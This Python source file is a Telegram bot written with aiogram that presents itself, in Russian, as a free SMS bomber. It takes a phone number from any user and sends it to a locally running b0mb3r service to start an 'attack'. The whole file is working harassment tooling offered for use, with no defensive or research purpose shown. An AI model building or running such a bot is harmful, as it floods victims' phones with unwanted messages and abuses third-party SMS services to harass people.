import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.builtin import Text
from config import TOKEN
import requests

API_TOKEN = TOKEN #is contained in config.py

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start', 'help', 'about'])
async def send_welcome(message: types.Message):
    await message.reply("Дороу, бро!\nЯ - бесплатный смс бомбер!\nСозданный с помощью библиотеки aiogram, а также открытого смс бомбера b0mb3r от crinny (https://github.com/crinny/b0mb3r).\nИсходный код можно найти на моём github(https://github.com/alex-lemeshinsky).\nЧтобы начать процес просто введите номер телефона в формате \"+380ХХХХХХХХХ\".")

@dp.message_handler(Text(contains='+'))
async def echo(message: types.Message):
    r = requests.post("http://127.0.0.1:8080/attack/start", json = {"number_of_cycles": 1, "phone": message.text})
    if r.status_code == 200:
        id = r.json()['id']
        await message.answer("Атака началсь успешно! ID: " + id)
    elif r.status_code == 500:
        await message.answer("Вы неправильно ввели номер телефона, попробуйте ещё раз.")
    else:
        await message.answer("Произошла ошибка")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)